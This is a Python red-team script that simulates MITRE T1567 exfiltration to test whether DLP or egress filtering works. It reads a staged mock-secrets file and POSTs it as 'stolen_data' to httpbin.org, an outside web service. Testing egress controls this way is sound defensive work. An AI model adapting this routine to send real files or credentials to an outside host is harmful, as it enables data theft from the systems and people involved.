#!/usr/bin/env python3
import json
import sys
import os
import urllib.request
import urllib.parse

def run_exfiltration(target: str) -> dict:
    sys.stderr.write(f"[*] Simulating Web Service Exfiltration (T1567) on {target}...\n")
    
    results = []
    vulns = []
    
    mock_file_path = "/tmp/redteam_mock_secrets.txt"
    exfil_url = "https://httpbin.org/post"
    
    try:
        sys.stderr.write(f"[DEBUG] Attempting to read staged data from {mock_file_path}...\n")
        
        if not os.path.exists(mock_file_path):
            sys.stderr.write(f"[-] Staged data file {mock_file_path} not found. Did dummy_file_create.py run?\n")
            return {
                "target": target if target else "local",
                "technique_id": "T1567",
                "vulns": vulns,
                "vulnerabilities_found": 0,
                "details": [{"action": "dlp_check", "error": "mock data not found"}]
            }
            
        with open(mock_file_path, "r") as f:
            data_to_exfil = f.read()
            
        sys.stderr.write(f"[DEBUG] Attempting to POST {len(data_to_exfil)} bytes of dummy data to {exfil_url}...\n")
        
        req_data = urllib.parse.urlencode({'stolen_data': data_to_exfil}).encode('utf-8')
        req = urllib.request.Request(exfil_url, data=req_data, method='POST')
        
        try:
            with urllib.request.urlopen(req, timeout=5) as response:
                status = response.getcode()
                
                results.append({
                    "action": "http_post_exfiltration",
                    "url": exfil_url,
                    "status_code": status,
                    "success": status == 200
                })
                
                if status == 200:
                    sys.stderr.write("[!] ALERT: Mock sensitive data successfully exfiltrated!\n")
                    vulns.append({
                        "title": "DLP/Egress Bypass (Data Exfiltrated)",
                        "description": f"Successfully exfiltrated synthetic sensitive data (mock credit cards/passwords) to an external web service ({exfil_url}) via HTTP POST. Data Loss Prevention (DLP) or egress filtering did not block the transmission.",
                        "severity": "high",
                        "mitre_id": "T1567"
                    })
                else:
                    sys.stderr.write(f"[-] HTTP POST failed with status {status}.\n")
                    
        except Exception as http_err:
            results.append({"action": "http_post_exfiltration", "error": str(http_err)})
            sys.stderr.write(f"[+] HTTP POST blocked or failed: {http_err}. DLP may be effective.\n")

    except Exception as e:
        results.append({"action": "dlp_check", "error": str(e)})
        sys.stderr.write(f"[-] ERROR during DLP check: {e}\n")
        
    return {
        "target": target if target else "local",
        "technique_id": "T1567",
        "vulns": vulns,
        "vulnerabilities_found": len(vulns),
        "details": results
    }

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    print(json.dumps(run_exfiltration(target), indent=2))
